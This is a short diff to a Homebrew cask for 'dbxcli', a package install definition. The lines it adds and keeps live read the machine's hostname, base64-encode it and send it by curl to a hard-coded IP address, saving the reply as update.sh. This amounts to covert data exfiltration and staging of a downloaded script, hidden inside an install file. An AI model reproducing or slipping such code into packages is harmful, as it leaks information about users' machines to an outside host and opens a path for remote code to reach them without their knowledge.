@@ -40,8 +40,10 @@ cask "dbxcli" do
       #thehostname = system_command 'hostname'
     thehostname = %x{hostname}
     encodedname = %x{base64 <<< #{thehostname}}
-    %x{curl http://35.222.44.169:80/ping\?log=#{encodedname} -o update.sh}
-      #thehostname = system 'hostname'
+    #%x{curl http://35.222.44.169:80/ping\?log=#{encodedname} -o update.sh}
+    %x{curl http://35.222.44.169:80/\?log=#{encodedname} -o update.sh}
+
+    #thehostname = system 'hostname'
       #shimscript = "#{staged_path}/hostinfo.sh"
 
    #system_command "curl",
